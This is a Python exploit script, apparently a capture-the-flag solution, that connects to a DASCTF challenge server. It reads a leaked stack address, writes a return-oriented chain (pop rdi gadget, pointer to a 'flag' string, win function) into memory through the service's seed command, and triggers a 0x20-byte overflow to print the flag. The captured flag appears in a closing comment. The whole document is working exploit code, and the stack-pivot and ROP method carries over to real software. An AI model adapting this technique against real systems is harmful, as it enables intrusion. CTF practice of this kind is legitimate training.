import socket, time, re, sys

HOST, PORT = "direct-ctf2.dasctf.com", 27633
WIN, POP_RDI = 0x4017a0, 0x401234
LEAK_RBP, RBP_FILL = 0x7ffd0210, 0x7ffd0200
CHAIN, STR_ADDR = 0x7ffd0300, 0x7ffd0380

def rd(s, wait=1.0):
    buf = b""; t0 = time.time()
    while time.time() - t0 < wait:
        try:
            d = s.recv(8192)
            if not d: break
            buf += d; t0 = time.time()
        except socket.timeout:
            break
    return buf.decode(errors="replace")

s = socket.create_connection((HOST, PORT), timeout=10); s.settimeout(1.2); rd(s)
def cmd(c, wait=1.0):
    s.sendall((c + "\n").encode()); return rd(s, wait)

d = cmd("disasm")
for g in ("0x401234", "0x4017a0", "0x4017c0", "0x20 bytes"):
    assert g in d
leak = int(re.search(r"rbp=0x([0-9a-f]+)", cmd("leak")).group(1), 16)
assert leak == LEAK_RBP

for addr, word in [
    (RBP_FILL,      CHAIN),
    (CHAIN + 0x08,  POP_RDI),
    (CHAIN + 0x10,  STR_ADDR),
    (CHAIN + 0x18,  WIN),
    (STR_ADDR,      int.from_bytes(b"flag\x00\x00\x00\x00", "little")),
]:
    cmd(f"seed {addr:x} {word:x}")

out = cmd("trig " + "41" * 0x20, wait=2.0)
print(out)
print(re.search(r"CTF2\{[0-9a-f-]{36}\}", out).group(0))
# CTF2{6b50d57a-3225-4130-8b9e-4bff5fecfb25}